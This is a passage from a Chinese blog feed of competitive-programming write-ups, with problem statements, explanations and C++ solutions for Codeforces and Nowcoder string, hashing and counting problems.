b[3]=131...a[2]=1,也就是现在子串1中的字符‘b’就在最后的位置a[1]=131,也就是现在子串1中的字符‘a’距离最后的位置相差一个base=131b[1]=1,也就是现在子串2中的字符‘a’就在最后的位置b[3]=131,也就是现在子串2中的字符‘c’距离最后的位置相差一个base=131分别sort,可以得到映射a[2]-b[1],a[1]-b[3]分析第三组2 1 3bacaba1: a[1]=131 b[1]=171622: a[2]=17161 b[2]=1313: a[3]=1 b[3]=0...a[3]=1，也就是现在子串1中的字符‘c’就在最后的位置a[2]=17161,也就是现在子串1中的字符‘b’距离最后的位置相差两个base=17161a[1]=131,也就是现在子串1中的字符‘a’距离最后的位置相差一个base=131b[1]=17161+1,也就是现在子串2中的字符‘a’在两个地方：最后的位置和距离最后的位置相差两个base=17161b[2]=131,也就是现在子串2中的字符‘b’距离最后的位置相差一个base=131分别sort,映射无法成功*/]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF1090 J Two Prefixes]]></title>
    <url>%2Fposts%2FCF1090%20J%20Two%20Prefixes%2F</url>
    <content type="text"><![CDATA[CF1090 J Two Prefixes CF1090 J Two Prefixes题意给两个字符串，问两个非空前缀拼成的字符串最多有多少种 思路只需要考虑重复的就行 考虑相同的$s = ab$我们用长度最长的$a$作为代表串 对$b$求$kmp$，然后我们在考虑$b$的一段前缀在$a$中出现的次数 这个出现的次数很明显就是重复了多少次了 题解代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;bits/stdc++.h&gt;using namespace std;#define ll long longconst int N = 2e5 + 5;char ch[N], s[N], t[N];int f[N], g[N], ans[N];void kmp(int n)&#123; for (int i = 2; i &lt;= n; i++) &#123; f[i] = f[i - 1]; while (f[i] &amp;&amp; ch[f[i] + 1] != ch[i]) f[i] = f[f[i]]; f[i] = (ch[f[i] + 1] == ch[i] ? f[i] + 1 : f[i]); &#125;&#125;void exkmp(int n)&#123; int ms = 1; for (int i = 2; i &lt;= n; i++) &#123; g[i] = max(0, min(g[i - ms + 1], ms + g[ms] - i)); while (i + g[i] &lt;= n &amp;&amp; ch[i + g[i]] == ch[1 + g[i]]) g[i]++; if (i + g[i] &gt; ms + g[ms]) ms = i; &#125; g[1] = n;&#125;int main()&#123; while (1) &#123; scanf("%s%s", t + 1, s + 1); int n = strlen(s + 1); memcpy(ch + 1, s + 1, sizeof(char) * (n)); kmp(n); /* printf("ch:%s\n", ch + 1); for (int i = 0; i &lt;= n; i++) printf("f[%d]:%d ", i, f[i]); printf("\n"); */ int ls = n, lt = strlen(t + 1); ch[++n] = '*'; for (int i = 1; i &lt;= lt; i++) ch[++n] = t[i]; exkmp(n); /* printf("ch:%s\n", ch + 1); for (int i = 0; i &lt;= n; i++) printf("g[%d]:%d ", i, g[i]); printf("\n"); */ for (int i = ls + 3; i &lt;= n; i++) ans[g[i]]++; for (int i = ls; i &gt;= 1; i--) ans[i] += ans[i + 1]; ll fin = 1ll * lt * ls; for (int i = 1; i &lt;= ls; i++) if (f[i])//如果存在前缀 fin -= ans[i - f[i]];//减去所有重合 printf("%I64d\n", fin); &#125; return 0;&#125; 重点解析1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889void exkmp(int n)&#123; int ms = 1; for (int i = 2; i &lt;= n; i++) &#123; g[i] = max(0, min(g[i - ms + 1], ms + g[ms] - i)); while (i + g[i] &lt;= n &amp;&amp; ch[i + g[i]] == ch[1 + g[i]]) g[i]++; if (i + g[i] &gt; ms + g[ms]) ms = i; &#125; g[1] = n;&#125;/*手动模拟跑一次就好了input:abaaaoutput:5kmp处理出s串的f数组f[0]:0 f[1]:0 f[2]:1然后两个字符串拼接aa*abams=1g[2]=max(0,min(g[2-1+1],1+g[1]-2))g[2]=max(0,min(g[2],g[1]-1))g[2]=max(0,min(0,-1))g[2]=02+g[2]&lt;=6 &amp;&amp; ch[2+0] == ch[1+0]g[2]=12+g[2]&gt;1+g[1]ms=2g[3]=max(0,min(g[3-2+1],2+g[2]-3))g[3]=max(0,min(g[2],g[2]-1))g[3]=03+g[3]&lt;=6 &amp;&amp; ch[3+0] == ch[2+0]3+g[3]&gt;2+g[2]ms=2g[4]=max(0,min(g[4-2+1],2+g[2]-4))g[4]=max(0,min(g[3],g[2]-2))g[4]=04+g[4]&lt;=6 &amp;&amp; ch[4+0] == ch[1+0]g[4]=14+g[4]&gt;2+g[2]ms=4g[5]=max(0,min(g[5-4+1],4+g[4]-5))g[5]=max(0,min(g[2],g[4]-1))g[5]=05+g[5]&lt;=6 &amp;&amp; ch[5+g[5]] == ch[1+g[5]]5+g[5]&gt;4+g[4]ms=4g[6]=max(0,min(g[6-4+1],4+g[4]-6))g[6]=max(0,min(g[3],g[4]-1))g[6]=06+g[6]&lt;=6 &amp;&amp; ch[6+0] == ch[1+g[i]]g[6]=1g[1]=6最后得到g[0]:0 g[1]:6 g[2]:1 g[3]:0 g[4]:1 g[5]:0 g[6]:1for (int i = ls + 3; i &lt;= n; i++) ans[g[i]]++;for (int i = ls; i &gt;= 1; i--) ans[i] += ans[i + 1];ans[g[5]]ans[0]=1ans[g[6]]ans[1]=1ans[2]=0ans[1]=1for (int i = 1; i &lt;= ls; i++) if (f[i]) fin -= ans[i - f[i]];-ans[2-f[2]]=-ans[1]*///TODO]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF898 F Restoring the Expression]]></title>
    <url>%2Fposts%2FCF898%20F%20Restoring%20the%20Expression%2F</url>
    <content type="text"><![CDATA[CF898 F Restoring the Expression CF898 F Restoring the Expression题意给一个由数字组成的长度$10^6$的串，要把串划分成符合整数加法的$“a+b=c”$形式 思路因为 $a+b=c$ ，所以 $lena$、$lenb$ 至少要有一个等于 $lenc$ 或 $lenc-1$ 所以枚举 $lena,lenb$，每次检验一下可不可行，如果可以就直接输出 题解代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;//板子如下const int N = 1e6 + 5;const int mod = 1e9 + 7;ll Hash[N], p[N], Base = 10;void Init(string si)&#123; int len = si.size(); //记录长度 Hash[0] = 0; for (int i = 0; i &lt; len; ++i) Hash[i + 1] = (Hash[i] * Base % mod + si[i] - '0') % mod; //处理出str的hash值 p[0] = 1; for (int i = 0; i &lt; len; ++i) p[i + 1] = p[i] * Base % mod;&#125;ll get(int l, int r) //得到起点为l，终点为r的子串的hash值&#123; if (r &lt; 0 || l - 1 &lt; 0 || r - l + 1 &lt; 0) return 0; return (Hash[r] - Hash[l - 1] * p[r - l + 1] % mod + mod) % mod;&#125;string si;int len, lenc;void print(int lena, int lenb) //找到分割点就直接输出&#123; for (int i = 0; i &lt;= lena - 1; i++) putchar(si[i]); putchar('+'); for (int i = lena; i &lt;= lena + lenb - 1; i++) putchar(si[i]); putchar('='); for (int i = lena + lenb; i &lt;= len - 1; i++) putchar(si[i]);&#125;bool check(int lena, int lenb) //避免hash碰撞&#123; string s1 = si.substr(0, lena); string s2 = si.substr(lena, lenb); string s3 = si.substr(lena + lenb, len - lena - lenb); int flag = 0, len3 = len - lena - lenb, i, j; for (i = lena - 1, j = lenb - 1; i &gt;= 0 &amp;&amp; j &gt;= 0; --i, --j) //下标从0开始，所以初始化都要减一 &#123; int a1 = s1[i] - '0', a2 = s2[j] - '0', a3 = a1 + a2 + flag; if (a3 &gt;= 10) a3 -= 10, flag = 1; //进一 else flag = 0; if (a3 != s3[len3 - (lena - i)] - '0') //对比数字是否相同 return false; &#125; return true;&#125;bool solve(int lena, int lenb) //枚举的是a和b&#123; if (lena &gt; lenc || lenb &gt; lenc) //加法结果位数最大 return false; if (lena &lt; 0 || lenb &lt; 0) //不存在 return false; if (si[lena] == '0' &amp;&amp; lenb != 1) //a，b和c这三个部分都不包含前导零，除非它本身是0 return false; if (si[lena + lenb] == '0' &amp;&amp; len - lena - lenb != 1) //同上 return false; if ((get(1, lena) + get(lena + 1, lena + lenb)) % mod != get(lena + lenb + 1, len)) //用hash值看看能不能成立 return false; //return true; return check(lena, lenb); //hash只能拒绝大部分，防止碰撞&#125;int main()&#123; cin &gt;&gt; si; Init(si); //hash模板 len = si.size(); for (lenc = 1; lenc &lt;= len - 2; ++lenc) //枚举a和b &#123; if (solve(lenc, len - lenc * 2)) //当lenc和lena相同 &#123; print(lenc, len - lenc * 2); return 0; &#125; if (solve(lenc - 1, len - lenc - (lenc - 1))) //当lena比lenc少一位 &#123; print(lenc - 1, len - lenc - (lenc - 1)); return 0; &#125; if (solve(len - lenc * 2, lenc)) //当lenc和lenb相同 &#123; print(len - lenc * 2, lenc); return 0; &#125; if (solve(len - lenc - (lenc - 1), lenc - 1)) //当lenb比lenc少一位 &#123; print(len - lenc - (lenc - 1), lenc - 1); return 0; &#125; &#125; return 0;&#125; Hash模板解析123456789101112131415161718192021222324const int N = 1e6 + 5;const int mod = 1e9 + 7;ll Hash[N], p[N], Base = 10;//Base玄学值貌似可以随意void Init(string si)&#123; int len = si.size(); //记录长度 Hash[0] = 0; for (int i = 0; i &lt; len; ++i) Hash[i + 1] = (Hash[i] * Base % mod + si[i] - '0') % mod; //处理出str的hash值 p[0] = 1; /* 这个p数组用于便于计算子串的hash值 也就是下面get函数的实现 */ for (int i = 0; i &lt; len; ++i) p[i + 1] = p[i] * Base % mod;&#125;ll get(int l, int r) //得到起点为l，终点为r的子串的hash值&#123; if (r &lt; 0 || l - 1 &lt; 0 || r - l + 1 &lt; 0) return 0; return (Hash[r] - Hash[l - 1] * p[r - l + 1] % mod + mod) % mod; //为了让同样的子串输出同样的hash&#125;]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>Hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CF149 E Martian Strings]]></title>
    <url>%2Fposts%2FCF149%20E%20Martian%20Strings%2F</url>
    <content type="text"><![CDATA[CF149 E Martian Strings CF149 E Martian Strings题意翻译输入第一行给定一个长度为 $n$ $(1\leq n \leq 1e5)$ 的字符串 $s$，该串仅由大写字母组成 第二行给定一个数 $m\ \ (1 \leq m \leq 100)$，接下来 $m$ 行表示 $m$ 个询问 每行一个字符串 $p_i$ $(1 \leq |p_i| \leq 1000)$，满足$p_i$互不相同。 一个询问 $p_i$可行当且仅当存在 $a,b,c,d$满足$1\leq a\leq b \lt c \leq d \leq n$且$ s_as_{a+1}\dots s_{b}s_{c}s_{c+1}\dots s_d = p_i$ 即可以找到两个不相交的区间，满足这两个区间对应的子串拼起来和 $p_i$相同 输出一行表示可行的询问的数量 思路先正向$kmp$，记录$T$的前缀的每一个长度，在$S$能匹配的最左边，也就是首次匹配的位置（指最后一位） 然后就是把寻找后缀，把$S$和$T$都逆序存好，再$kmp$一次 看是否可以找到一个长度为$x$的后缀的位置在一个长度为$len-x$的前缀的位置之后，如果可以找到就是合法的 题解代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;cstdio&gt;#include &lt;cmath&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;#include &lt;set&gt;#define LL long longconst int inf = 1e9 + 9;const int N = 2e5 + 5;using namespace std;char s[N], t[N], c[N];int a[N], nxt[N];void next(char x[], int f[]) //板子&#123; int m = strlen(x); f[0] = f[1] = 0; for (int i = 1; i &lt; m; i++) &#123; int j = f[i]; while (j &amp;&amp; x[i] != x[j]) j = f[j]; f[i + 1] = x[i] == x[j] ? 1 + j : 0; &#125; /* for (int i = 0; i &lt;= m; i++) printf("%d:%d ", i, f[i]); printf("\n"); */&#125;bool find(char s[], char t[], int f[], int v)&#123; next(t, f); //kmp的一种模板 int n = strlen(s), m = strlen(t), j = 0; for (int i = 0; i &lt; n; i++) &#123; while (j &amp;&amp; s[i] != t[j]) j = f[j]; if (s[i] == t[j]) ++j; if (v == 1 &amp;&amp; j &amp;&amp; a[j] == -1) a[j] = i;//正向的时候，用把第一个前缀为j的最后一个位置i存进数组a[j]里 /* 目前是反向，由于目前的前缀的长度是j，也就是原串的后缀长度目前是j 所以先要确认之前正向的时候标记的长度是m-j的前缀存不存在 然后要确认位置，因为这两个区间不能重合 */ if (v == 2 &amp;&amp; j &amp;&amp; a[m - j] != -1 &amp;&amp; a[m - j] &lt; n - i - 1) return 1; //只要成立一个就可以了 &#125; return 0;&#125;void back(char s[], int n) //一个简单的倒置&#123; char ch; for (int i = 0, k = n - 1; i &lt; n / 2; i++, k--) &#123; ch = s[i]; s[i] = s[k]; s[k] = ch; &#125;&#125;int main()&#123; scanf("%s", s); int m, cnt = 0; scanf("%d", &amp;m); while (m--) &#123; scanf("%s", t); memset(a, -1, sizeof(a)); //全初始化为-1 find(s, t, nxt, 1); //正向匹配 int n = strlen(s); for (int i = n - 1, k = 0; i &gt;= 0; i--) //把s倒过来，由于下次还要用，所以不能用back函数 c[k++] = s[i]; back(t, strlen(t)); //把t倒过来 if (find(c, t, nxt, 2)) //反向kmp去找符合的情况，如果存在就加一 cnt++; &#125; printf("%d\n", cnt); return 0;&#125; 重点函数123456789101112131415161718192021222324252627282930313233343536373839404142434445void next(char x[], int f[]) //板子&#123; int m = strlen(x); f[0] = f[1] = 0; for (int i = 1; i &lt; m; i++) &#123; int j = f[i]; while (j &amp;&amp; x[i] != x[j]) j = f[j]; f[i + 1] = x[i] == x[j] ? 1 + j : 0; &#125; /* for (int i = 0; i &lt;= m; i++) printf("%d:%d ", i, f[i]); printf("\n"); */&#125;/*怎么去理解这个板子呢？先带入样例去看看它是怎么跑的ABCBABA2BAABABBABAAB\ABBA 一样的f[1]=f[0]=0j=f[1]=0x[1]=A,x[0]=Bf[2]=0j=f[2]=0x[2]=A,x[0]=Bf[3]=0j=f[3]=0x[3]=A,x[0]=Af[4]=1最后我们可以得到f[4]=1，其它都是等于0f[4]=1的意思就是ABBA成立，下一个成立的是ABBABBAf[1]=0也就是ABBABBA成立，下一个成立的是ABBAABBA所以next函数将字符串从最大前缀开始向下搜，确保我们能得到符合条件内最大前缀长度*/]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tavas and Malekas]]></title>
    <url>%2Fposts%2FTavas%20and%20Malekas%2F</url>
    <content type="text"><![CDATA[Tavas and Malekas Tavas and Malekas题意给你一个子串$p$，且在长度为$n$的原串中出现的$m$个插入位，问原串有几种可能 https://acm.njupt.edu.cn/contest/123/board/challenge/G 思路首先对字符串$p$做一次$kmp$ 然后对原串一个个插入 如果没有冲突，填完后剩下部分的空，每个都能填$26$个字母，$mod$后输出就行 解析见注释 代码部分1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;bits/stdc++.h&gt;#define ll long longusing namespace std;const int maxn = 1e6 + 7;const int MOD = 1e9 + 7;typedef long long LL;char s[maxn];int N, M, a[maxn], nt[maxn];char p[maxn];bool vis[maxn], vis1[maxn];void getnext(char *s, int len)//函数解析见重点解析&#123; nt[0] = -1; int i = 0, j = -1; while (i &lt; len) &#123; if (j == -1 || s[i] == s[j]) &#123; i++, j++; nt[i] = j; &#125; else j = nt[j]; &#125; int r = len; while (r != -1) &#123; vis1[r] = 1; r = nt[r]; &#125;&#125;int main()&#123; scanf("%d%d", &amp;N, &amp;M); scanf("%s", s); int len = strlen(s); getnext(s, len); for (int i = 1; i &lt;= M; i++) scanf("%d", &amp;a[i]); sort(a + 1, a + 1 + M); for (int i = 1; i &lt;= M; i++) &#123; if (i == 1 || a[i] - a[i - 1] &gt;= len) &#123; for (int j = a[i]; j &lt; a[i] + len; j++) //标记为占用 vis[j] = 1; &#125; else //如果发生冲突 &#123; if (vis1[a[i - 1] + len - a[i]]) //a[i-1]的后缀和a[i]的前缀重叠 &#123; for (int j = a[i - 1] + len; j &lt; a[i] + len; j++) //然后对这部分打标记 vis[j] = 1; &#125; else //冲突了，这个字符串无法构成，直接输出零就行 &#123; printf("0\n"); return 0; &#125; &#125; &#125; LL cnt = 1; for (int i = 1; i &lt;= N; i++) //剩下的空26个字母都可以填 if (!vis[i]) cnt = (cnt * 26) % MOD; cout &lt;&lt; cnt &lt;&lt; endl; return 0;&#125; 重点解析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void getnext(char *s, int len)//对这个函数，带入样例IOI看一下结果&#123; nt[0] = -1; int i = 0, j = -1; while (i &lt; len) &#123; if (j == -1 || s[i] == s[j]) &#123; i++, j++; nt[i] = j; &#125; else j = nt[j]; &#125; int r = len; while (r != -1) &#123; vis1[r] = 1; r = nt[r]; &#125;&#125;/*运行逻辑如下 IOI nt[0] = -1 i = 0,j = -1 //以上为初始化 i = 1, j = 0 nt[1] = 0 s[1] = o,s[0] = i j = nt[0] = -1 i = 2,j = 0 nt[2] = 0 s[2] = i,s[0] = i i = 3,j = 1 nt[3] = 1 //跳出 r = 3 //由于下标从0开始，所以len绝对成立 v1[3] = 1 r = nt[3] = 1 v1[1] = 1 r = nt[1] = 0 v1[0] = 1 r = -1 //跳出*//* 可以得到v1数组的0，1，3下标被标记了 这个0的意思是IOIIOI成立，也就是前一个S和后一个S相交字符为0个 这个1的意思是IOIOI成立，也就是前一个S和后一个S相交字符为1个 这个3的意思是IOI成立，也就是前一个S和后一个S相交字符为3个 */]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020牛客寒假算法基础集训营第一场]]></title>
    <url>%2Fposts%2F2020%E7%89%9B%E5%AE%A2%E5%AF%92%E5%81%87%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E9%9B%86%E8%AE%AD%E8%90%A5%E7%AC%AC%E4%B8%80%E5%9C%BA%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[2020牛客寒假算法基础集训营第一场的题面与题解 A - honoka和格点三角形题目描述$honoka$最近在研究三角形计数问题。 她认为，满足以下三个条件的三角形是“好三角形”： 三角形的三个顶点均为格点，即横坐标和纵坐标均为整数。 三角形的面积为 $1$。 三角形至少有一条边和 $x$ 轴或 $y$ 轴平行。 $honoka$想知道，在平面中选取一个大小为 $n*m$ 的矩形格点阵，可以找到多少个不同的“好三角形”？ 由于答案可能过大，请对 $1000000007$取模。 输入描述:两个正整数 $n$ 和 $m$ $(2\leq n,m\leq 10^{9})$ 输出描述:面积为 $1$ 的格点三角形的数量，对$10^9+7$取模的结果 示例1输入12 3 输出16 说明1234567891011121314格点如下：* * ** * *不妨设左下角坐标为(1,1)，右上角坐标为到(3,2)。那么三点坐标可选：（1，1）（1，2）（3，1）（1，1）（1，2）（3，2）（1，1）（2，2）（3，1）（1，1）（3，1）（3，2）（1，2）（2，1）（3，2）（1，2）（3，1）（3，2）所以共有6个。 示例2输入1100 100 输出17683984 说明1这里太小写不下啦-. - 题解题意先把点阵看成笛卡尔坐标系，令$x$方向长为$n$，$y$方向长为$m$ 面积为一的、有一条边平行与轴的三角形列举一下： 底为$1$，高为$2$ 底为$2$，高为$1$ 这里我们可以预测肯定会出现重复的情况，重复的情况就是底和高都平行于轴 思路有边平行于$x$轴的三角形当底为$2$的时候： 每一行有$n-2$个底，对于高，我们先默认从下往上看，比底高一个单位那一整行都可以作为它的高，所以高有$n$个，并且有$m-1$个这种从下往上看的高成立，所以一共有$(n-2)\times n\times (m-1)$个三角形成立，从上往下也是一样所以乘个$2$就行 当底为$1$的时候： 每一行有$n-1$个底，对于高，我们先默认从下往上看，比底高两个单位那一整行都可以作为它的高，所以高有$n$个，并且有$m-2$个这种从下往上看的高成立，所以一共有$(n-1)\times n\times (m-2)$个三角形成立，从上往下也是一样所以乘个$2$就行 有边平行于$y$轴的三角形把上述n和m对调一下就行，但是要去掉相同的部分 对于每个底来说，只有两个高会让这个三角形底和高同时平行于坐标轴，所以每行的高只用$m-2$个就行 $(m-2)\times (m-2)\times (n-1)$ $(m-1)\times (m-2)\times (n-2)$ 代码1234567891011#include&lt;bits/stdc++.h&gt; using namespace std;typedef long long ll;#define mod 1000000007ll n, m, ans;int main()&#123; scanf("%lld%lld", &amp;n, &amp;m); ans=((n-2)%mod*2%mod*(m-1)%mod*n%mod+(n-1)%mod*2%mod*n%mod*(m-2)%mod+2*(m-2)%mod*(m-2)%mod*(n-1)%mod+2*(n-2)%mod*(m-1)%mod*(m-2)%mod)%mod; printf("%lld\n",ans); return 0;&#125; C - umi和弓道题目描述$umi$对弓道非常痴迷。 有一天，她在研究一个射箭问题： 在一个无限大的平面中，她站在 $(x_0,y_0)$ 这个坐标。 有 $n$ 个靶子，第 $i$ 个靶子的坐标是 $(x_i,y_i)$ $umi$准备在 $x$ 轴或 $y$ 轴上放置一块挡板来挡住弓箭的轨迹，使得她可以射中的靶子数量不超过 $k$个。 她想知道挡板的最短长度是多少？ 注：假定弓箭的轨迹是一条起点是$umi$坐标，长度无穷大的射线 umi和靶子的体积可以无视，挡板的边缘碰到弓箭轨迹也可视为挡住弓箭。 注：挡板不能弯折，起始和终点必须在同一坐标轴上。 输入描述:第一行两个整数$x_0,y_0$代表$umi$的坐标。 第二行两个正整数 $n$ 和 $k$，分别代表靶子的总数量、放置挡板后可射中靶子的最大值。 接下来的 $n$ 行，每行两个整数$x_i$和$y_i$，代表每个靶子的坐标。 保证没有任何一个点在坐标轴上（无论$umi$还是靶子），保证没有任何两点重合。 $(1\leq n \leq 100000, 0\leq k \leq n-2, -2 \times 10^9 \leq x_i,y_i \leq 2 \times 10^9)$ 输出描述:若无论如何无法保证可以射中的靶子数量不超过$k$个，则输出$-1$。否则输出挡板的最小长度。如果你和正确答案的误差不超过$10^{-6}$，则视为答案正确。 示例1输入12341 12 0-1 2-2 1 输出10.50000000 说明1umi要保证能射中的靶子不超过0个，即全部挡住。在y轴上选区间[1,1.5]放置一个长度为0.5的挡板即可。 题解题意二维图上有一个特殊点，所有点都与它相连，现在只能在x轴或者y轴上面放一个板子隔断他们之间的线 问如何保证最多只剩k条线，板子越小越好 思路首先确定$umi$所在位置的象限。 对于不在一个象限的点，与$umi$连线，找出线段和 $x$ 轴或 $y$ 轴的交点，记录坐标位置。 之后双指针维护 $x$ 轴上或者 $y$ 轴挡住 $n−k$ 个点的挡板长度最小值。 注意 $x$ 轴和 $y$ 轴要分开计算。 代码1234567891011121314151617181920212223242526272829303132333435363738#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;vector&lt;double&gt; v1,v2;int main()&#123; double x0, y0; int n, k; cin&gt;&gt;x0&gt;&gt;y0&gt;&gt;n&gt;&gt;k; k = n - k; for(int i = 0; i &lt; n; i++)&#123; double x, y; cin&gt;&gt;x&gt;&gt;y; if(x*x0&lt;0) v2.push_back(y0-x0*(y-y0)/(x-x0)); if(y*y0&lt;0) v1.push_back(x0-y0*(x-x0)/(y-y0)); &#125; double mi = 1e18; sort(v1.begin(), v1.end()); if(v1.size()&gt;=k)&#123; double head = 0, tail = k-1; //双指针，用mi维护x轴上的最小值 while(tail&lt;v1.size())&#123; mi = min(mi, v1[tail]-v1[head]); tail++, head++; &#125; &#125; sort(v2.begin(), v2.end()); if(v2.size()&gt;=k)&#123; double head = 0, tail = k-1; //双指针，用mi维护y轴上的最小值 while(tail&lt;v2.size())&#123; mi = min(mi, v2[tail]-v2[head]); tail++, head++; &#125; &#125; if(mi==1e18) printf("-1\n"); else printf("%.7lf\n", mi); return 0; &#125; E - rin和快速迭代题目描述 ”数论真的太好玩了喵~“——hoshizora rin $rin$最近喜欢上了数论。 然而数论实在太复杂了，她只能研究一些简单的问题。 这天，她在研究正整数因子个数的时候，想到了一个“快速迭代”算法。 设 $f(x)$ 为 $x$ 的因子个数，将其迭代下去，$rin$猜想任意正整数最终都会变成 $2$ 。 例如:$f(12)=6,f(6)=4,f(4)=3,f(3)=2$ 她会给你一个正整数 $n$ ，让你输出它在迭代过程中，第一次迭代成 $2$ 的迭代次数。 输入描述:一个正整数 $n$ $(3 \leq n \leq 10^{12})$ 输出描述:一个正整数，为 $n$ 迭代至 $2$ 的次数。 示例1输入112 输出14 说明1234512的因子：1，2，3，4，6，12。共6个。6的因子：1，2，3，6。共4个。4的因子：1，2，4。共3个。3的因子：1，3。共2个。12 → 6 → 4 → 3 → 2 ， 故迭代了4次。 题解题意求迭代次数 思路约数个数定理 代码123456789101112131415161718192021222324252627282930313233343536373839#include&lt;bits/stdc++.h&gt; using namespace std;typedef long long ll;#define mod 1000000007ll n, m, ans, num;void f()&#123; ll time = 0; while (ans!=2)&#123; ans = 1; for (int i = 2; i*i &lt;= m; i++)&#123; num = 0; while (m%i == 0)&#123; num++; //记录这个因数有多少个 m = m / i; //直接去掉已记录的因数 &#125; if (num &gt; 0)&#123; //因数存在 num++; /* 存在num+1种情况： 如果一开始输入的是12，那现在就是有了两个2 我们构造因数的时候就会有三种方法： 1、内含0个2 2、内含1个2 3、内含2个2 */ ans = ans * num; //现在就有ans * num个因数了 &#125; &#125; if (m &gt; 1) ans = ans * 2; //还有剩下的一个质数，因数有两种情况，含它和不含它 m = ans; //迭代 time++; &#125; printf("%lld\n",time);&#125;int main()&#123; scanf("%lld", &amp;m); f(); return 0;&#125; F - maki和tree题目描述有一天，$maki$拿到了一颗树。所谓树，即没有自环、重边和回路的无向连通图。 这个树有 $n$ 个顶点， $n-1$ 条边。每个顶点被染成了白色或者黑色。 $maki$想知道，取两个不同的点，它们的简单路径上有且仅有一个黑色点的取法有多少？ $Tips$： 树上两点简单路径指连接两点的最短路 $(q,p),(p,q)$视为同一个路径 输入描述:第一行一个正整数 $n$，代表顶点数量。$(3 \leq n \leq 10^{5})$ 第二行是一个仅由字符$’B’$和$’W’$组成的字符串。第$i$个字符是$B$代表第 $i$ 个点是黑色，$W$代表第$i$个点是白色。 接下来的 $n-1$ 行，每行两个正整数 $x$ ，$y$ ，代表 $x$ 点和 $y$ 点有一条边相连 $(1\leq x,y \leq n)$ 输出描述:一个正整数，表示只经过一个黑色点的路径数量。 示例1输入12343WBW1 22 3 输出13 说明123只有2号是黑色点。&lt;1,2&gt;、&lt;2,3&gt;、&lt;1,3&gt;三种取法都只经过一个黑色点。 题解题意只有一个黑色点的路径数 思路路径有两种： 黑点在中间或者端点 在中间的时候：联通块白点数*其他联通块白点数 在端点的时候：联通块白点数*一个黑点 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll; #define N 100005ll n,m,k,ans;ll head[N],col[N],num[N];bool vis[N];string s;ll ans1;struct node&#123; ll v,next;&#125;a[N*2];void add(ll u,ll v)&#123; a[++k].v=v,a[k].next=head[u]; head[u]=k;&#125;void dfs(int x,int fa)&#123; if(col[x]) return; ans1++; for(int i=head[x];i;i=a[i].next)&#123; if(a[i].v!=fa) dfs(a[i].v,x); &#125;&#125;int main()&#123; scanf("%lld",&amp;n); cin&gt;&gt;s; for(int i=1;i&lt;=n;i++) //上色 if(s[i-1]=='B') col[i]=1; else col[i]=0; for(int i=1;i&lt;n;i++)&#123; ll u,v; scanf("%lld%lld",&amp;u,&amp;v); //无向图 add(u,v); add(v,u); &#125; for(int i=1;i&lt;=n;i++)&#123; if(s[i-1]=='B')&#123; ll cnt=0,res=0; for(int j=head[i];j;j=a[j].next)&#123; ans1=0; dfs(a[j].v,i); num[++cnt]=ans1; res+=ans1; &#125; for(int j=1;j&lt;=cnt;j++) ans+=num[j]*(res-num[j]+1),res-=num[j]; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; return 0;&#125; G - eli和字符串题目描述$eli$拿到了一个仅由小写字母组成的字符串。 她想截取一段连续子串，这个子串包含至少 $k$ 个相同的某个字母。 她想知道，子串的长度最小值是多少？ 注：所谓连续子串，指字符串删除头部和尾部的部分字符（也可以不删除）剩下的字符串。 例如：对于字符串$“arcaea”$而言，$“arc”、“rcae”$都是其子串，而$“car”、“aa”$则不是它的子串。 输入描述:第一行输入两个正整数$n$和$k$ $(1 \leq n,k \leq 200000)$ 输入仅有一行，为一个长度为$n$的、仅由小写字母组成的字符串。 输出描述:如果无论怎么取都无法满足条件，输出 $-1$ 。否则输出一个正整数，为满足条件的子串长度最小值。 示例1输入125 2abeba 输出13 说明1选择“beb”子串，长度为3，其中包含相同的两个&apos;b&apos; 题解题意仅含$k$个相同字母的最短连续子序列长度 思路一共就$26$个字母，记录个数和分别的位置，跑$26$次就行了 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;bits/stdc++.h&gt;using namespace std;struct zm&#123; int wz[200000]; int num;&#125; a[26];int main()&#123; int n, k; cin &gt;&gt; n &gt;&gt; k; char ch[200005]; cin &gt;&gt; ch; int flag = 0; for (int i = 0; i &lt; n; i++) &#123; a[ch[i] - 'a'].wz[a[ch[i] - 'a'].num] = i; a[ch[i] - 'a'].num++; if (a[ch[i] - 'a'].num &gt;= k) flag = 1; &#125; if (flag == 0) &#123; cout &lt;&lt; -1; return 0; &#125; else &#123; int mi = 1e18; int l; for (int i = 0; i &lt; 26; i++) &#123; int head = 0, tail = k - 1; if (a[i].num &gt;= k) &#123; while (tail &lt; a[i].num) &#123; l = a[i].wz[tail] - a[i].wz[head] + 1; mi = min(l, mi); head++; tail++; &#125; &#125; &#125; cout &lt;&lt; mi; &#125;&#125; H - nozomi和字符串题目描述$nozomi$ 看到 $eli$ 